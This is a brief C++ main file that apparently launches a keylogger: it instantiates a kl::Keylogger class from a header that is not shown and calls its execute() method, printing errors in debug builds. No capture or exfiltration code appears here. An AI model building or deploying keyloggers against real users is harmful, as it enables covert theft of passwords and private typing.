#define DEBUG

#include "keylogger.hpp"

#include <exception>
#include <iostream>

int main(int argc, char* argv[]) {
  kl::Keylogger keylogger;

  try {
    keylogger.execute();
  } catch (std::exception& error_) {
    #ifdef DEBUG
    std::cout << error_.what() << std::endl;
    #endif
  }

  return 0;
} 
